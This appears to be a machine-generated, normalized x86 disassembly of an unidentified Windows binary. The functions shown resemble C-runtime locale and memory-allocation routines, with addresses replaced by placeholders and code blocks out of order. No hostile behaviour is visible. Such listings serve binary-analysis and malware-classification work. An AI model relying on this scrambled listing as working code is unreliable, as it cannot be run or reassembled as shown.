mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_4123bf
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_412297
pop ecx
pop edi
sub_4123e5
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_412297
pop ecx
test esi esi
je r-xdata
push esi
call sub_412326
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rwxdata
je r-xdata
push esi
call sub_41214e
pop ecx
sub_412423
push 0xc
push r--data
call sub_40e30c
call sub_40e99d
mov esi eax
mov eax [ rwxdata ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rwxdata ]
call sub_4123e5
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41248d
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40e99d
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40e351
retn
push 0x20
call sub_410a02
pop ecx
sub_412499
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_40e99d
mov ecx [ eax + 0x70 ]
test cl 0x2
push 0x0
pop edx
sete dl
inc edx
mov edi edx
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
or [ rwxdata ] 0xffffffff
xor esi esi
cmp edx esi
je r-xdata
mov eax edi
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ eax + 0x70 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_412503
mov eax [ rwxdata ]
mov ecx [ eax + 0x4 ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0x8 ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xbc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rwxdata ] ecx
mov eax [ eax + 0xac ]
mov [ rwxdata ] eax
retn
sub_412556
push 0x8
push r--data
call sub_40e30c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40e351
retn
push 0xd
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412603
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_40fe78
pop ecx
push 0xc
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_412326
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41260f
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_40fe78
pop ecx
cmp eax rwxdata
je r-xdata
push eax
call sub_41214e
pop ecx
sub_412623
push 0xc
push r--data
call sub_40e30c
call sub_40e99d
mov edi eax
push 0x1
push 0x8
call sub_41348c
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
call sub_412423
call sub_411c47
mov eax [ edi + 0x6c ]
mov [ esi ] eax
mov eax [ edi + 0x68 ]
mov [ esi + 0x4 ] eax
push 0xc
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_412297
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4126bd
push 0xd
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x4 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4126c9
mov eax esi
call sub_40d7cc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40e351
retn
sub_4126da
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a16a
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_41271a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_413d20
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_41cd20
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_41cd20
test eax eax
sub_412843
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4192c8
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4126da
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4126da
add esp 0x14
sub_4128b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_413447
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_4126da
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_4126da
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_41a16a
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_40fe78
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_40fe78
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_40fe78
pop ecx
push [ esi + 0x54 ]
call sub_40fe78
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_40fe78
pop ecx
sub_412a2d
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_40e99d
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_4136f0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_41271a
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_4192c8
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_41d361
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_412843
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_40f720
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_40f720
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_412c5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_40e99d
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_412a2d
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_4136f0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_413447
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_40f720
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_4192c8
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_40f720
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rwxdata
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_40fe78
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_41aba8
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_40fe78
push [ ebx + 0x54 ]
call sub_40fe78
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rwxdata ]
lea eax [ ebp - 0x188 ]
push eax
call sub_41eac8
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_412f60
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_4128b0
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_412c5e
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_412a2d
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_412c5e
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_420148
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_4136f0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_41cd20
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_412c5e
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d5e2
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_420210
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_41317b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_41348c
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_41348c
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_40d7cc
mov [ eax ] 0xc
push edi
push 0x220
call sub_41348c
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_40fe78
mov eax [ esi ]
mov ecx rwxdata
call sub_4123bf
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_412f60
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_40fe78
push esi
call sub_40fe78
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_411d67
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_412326
push [ esi ]
call sub_41214e
push esi
call sub_40fe78
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_40fe78
push [ esi ]
call sub_412326
push [ esi ]
call sub_41214e
push esi
call sub_40fe78
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_41327b
push 0x14
push r--data
call sub_40e30c
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_40e99d
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_412423
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_41348c
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4133e6
mov eax [ ebp - 0x20 ]
push 0xc
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_4123bf
mov [ ebp - 0x4 ] ebx
call sub_4133a9
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_412f60
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_40e351
retn
push edi
call sub_412326
push edi
call sub_41214e
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_4123e5
push edi
call sub_412326
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rwxdata
push [ ebp + 0xc ]
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4133b5
jmp r-xdata
test [ rwxdata ] 0x1
jne r-xdata
mov [ rwxdata ] 0x1
mov edi [ ebx ]
mov eax rwxdata
call sub_4123e5
push 0x18
mov eax [ rwxdata ]
add eax 0xc
push eax
push rwxdata
call sub_40f720
add esp 0xc
call sub_412503
sub_4133eb
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rwxdata ]
push [ esi ]
call sub_40e699
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_41340c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ Sleep@IAT ]
add esi 0x3e8
cmp esi [ rwxdata ]
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
or esi 0xffffffff
sub_413447
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_4107e9
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_41348c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420259
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4134d8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420377
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_413526
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420592
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_413578
push 0xc
push r--data
call sub_40e30c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_40dd54
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_40de6c
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40dd54
add eax ebx
push eax
call sub_42060d
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40dd54
add eax ebx
push eax
call sub_40ca3b
mov [ ebp - 0x1c ] eax
call sub_40dd54
add eax ebx
push eax
push edi
call sub_4206a9
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413614
mov eax [ ebp - 0x1c ]
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_40e351
retn
sub_4136a2
mov edi edi
push ebp
mov ebp esp
mov ecx [ rwxdata ]
mov edx [ ebp + 0x8 ]
or ecx 0x1
xor eax eax
cmp [ rwxdata ] ecx
sete al
neg edx
sbb edx edx
and edx ecx
mov [ rwxdata ] edx
pop ebp
retn
sub_4136f0
mov ecx [ esp + 0x4 ]
